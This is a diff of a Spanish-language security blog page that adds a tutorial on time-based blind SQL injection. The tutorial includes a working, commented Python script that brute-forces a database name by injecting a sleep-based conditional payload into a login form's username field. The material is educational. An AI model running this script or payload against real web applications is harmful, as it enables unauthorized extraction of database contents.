@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
     <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/articles_general.css">
     <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/article.css">
+    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/prism.css">
 </head>
 <body>
     <header class="header">
@@ -31,12 +32,86 @@
             </p>
 
             <article class="article">
-                <h2 class="article_title">Inyección SQL basada en tiempo</h2>
+                <h2 class="article_subtitle">Inyección SQL basada en tiempo</h2>
+                <h3 class="article_subtitle2">¿Qué es?</h3>
+                <p class="description">
+                    Imagina que estás tratando de abrir una caja fuerte sin saber la combinación. En lugar de ver los números directamente, solo puedes medir el <b>tiempo</b> que tarda la cerradura en responder a cada intento. Si introduces una combinación correcta, la cerradura podría tardar un poco más en abrirse, revelando así que estás en el camino correcto. Esto es, en esencia, lo que ocurre en una <b>inyección SQL ciega basada en tiempo</b>.
+                    <br><br>
+                    En el contexto de la seguridad informática, una inyección SQL ciega basada en tiempo es un tipo de ataque cibernético en el que el atacante explota una vulnerabilidad en una aplicación web para extraer información de una base de datos <b>sin que se muestre directamente en la salida</b>. En lugar de ver los resultados de una consulta SQL maliciosa, el atacante mide el tiempo que tarda la aplicación en responder. Si la consulta provoca un retraso, esto indica que la consulta ha sido al menos parcialmente <b>exitosa</b>.
+                </p>
+                <h3 class="article_subtitle2">Scripts</h3>
+                <p class="description">
+                    Para acceder a los valores de las bases de datos a través de esta vulnerabilidad (que es lo que cualquier atacante quiere) primero debes tener estos <b>requisitos</b>: <i>nombre de la base de datos utilizada</i>, <i>las tablas</i> que contiene la base de datos y <i>las columnas</i> que contiene la tabla.
+                </p>
+                <p class="description">
+                    Para obtener lo anterior, e creado una serie de <strong>scripts en python</strong> que se aprovechan de un <i>input</i> vulnerable de un formulario para ejecutar las <b>consultas sql</b>.
+                </p>
+                <p class="description">
+                    El primero descubre el nombre de la <b>base de datos</b> utilizada, el código es el siguiente:
+                </p>
+                <pre class="code"><code class="language-python"># Importa las librerias de pwntools
+from pwn import *
+# Importa las librerías requests para hacer peticiones HTTP, string para acceder a cadenas de caracteres y time para trabajar con el tiempo.
+import requests, string, time
+
+#Define una función ctrl_c que se activa cuando se presiona Ctrl+C. 
+def ctrl_c(sig,frame):
+    print('\n\n Saliendo...\n')
+    sys.exit(1) # Termina el programa.
+
+signal.signal(signal.SIGINT, ctrl_c) # Registra la función ctrl_c para que se ejecute cuando se reciba la señal de interrupción (Ctrl+C).
+
+# Variables globales
+main_url = 'http://ejemplo.com/loginvulnerable.html' # Almacena la URL del sitio vulnerable
+characters = string.ascii_lowercase + string.digits # Define los caracteres permitidos para la fuerza bruta (letras minúsculas y números).
+
+# Define una función makeRequests que recibe una URL como parámetro. 
+def makeRequests(url):
+    # Crea una barra de progreso con un mensaje inicial.
+    p1 = log.progress('Iniciando fuerza bruta') 
+    time.sleep(2) # Introduce un retraso de 2 segundos
+    # Crea otra barra de progreso para mostrar la base de datos encontrada.
+    p2 = log.progress('Base de Datos')
+    database = '' # Inicializa una variable vacía para almacenar la base de datos.
+
+    # Recorre un bucle desde la posición 1 hasta el 10 (para iterar por los caracteres de la base de datos). 
+    for position in range(1,11):
+        # Recorre un bucle por cada carácter permitido en la fuerza bruta. 
+        for character in characters:
+            # Crea un diccionario que contiene los datos para la petición POST. 
+            # La parte más importante: la consulta SQL maliciosa se inyecta en la clave 'usuario'. 
+            post_data = {
+                # Esta consulta aprovecha la inyección para verificar si el caracter en la posición position de la base de datos coincide con el caracter actual del bucle (character).
+                # if(...,sleep(3),1): Condicional que introduce un retraso de 3 segundos si el caracter coincide (sleep(3)) o sigue con 1 si no coincide.
+                'usuario': f"test' or if(substring(database(),{position},1)='{character}',sleep(3),1)-- -",
+                'contraseña': 'test'
+            }
+            
+            # Actualiza la barra de progreso 1 con la consulta SQL maliciosa que se está enviando.
+            p1.status(post_data['usuario'])
+            start_time = time.time() # Guarda el tiempo de inicio de la petición.
+            # Envía la petición POST a la URL con los datos del diccionario.
+            response = requests.post(url, data=post_data)
+            end_time = time.time() # Guarda el tiempo de finalización de la petición.
+
+            # Comprueba si la diferencia entre el tiempo final e inicial es mayor o igual a 3 segundos. 
+            # Si es mayor o igual a 3 segundos, significa que la consulta tardó más y probablemente el caracter coincide con el de la base de datos. 
+            if (end_time - start_time) >= 3:
+                database += character # Se agrega el caracter encontrado a la variable database.
+                p2.status(database) # Actualiza la barra de progreso 2 con el contenido de la variable database
+                break # Termina el bucle
+
+if __name__ == '__main__':
+    makeRequests(main_url)</code></pre>
+                <p class="description">
+                    
+                </p>
             </article>
         </main>
     </div>
     <footer class="footer">
         <a target="_blank" href="https://github.com/n4g1h4ck" class="link bi bi-github"></a>
     </footer>
+    <script src="https://n4g1h4ck.github.io/js/prism.js"></script>
 </body>
 </html>
